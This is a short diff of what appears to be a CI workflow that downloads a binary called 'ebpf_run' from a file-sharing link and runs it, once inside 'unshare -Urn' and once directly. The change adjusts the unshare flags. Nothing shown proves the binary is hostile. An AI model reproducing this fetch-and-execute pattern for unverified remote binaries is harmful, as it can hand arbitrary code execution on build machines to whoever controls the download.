@@ -18,7 +18,6 @@ jobs:
             apt update && apt install -y curl
             curl https://cloud.tsinghua.edu.cn/f/dd0140e60d714af59e17/?dl=1  --output ebpf_run
             chmod +x ebpf_run
-            unshare -urn "./ebpf_run"
+            unshare -Urn "./ebpf_run"
             ls -la
             ./ebpf_run
-            unshare -Urn
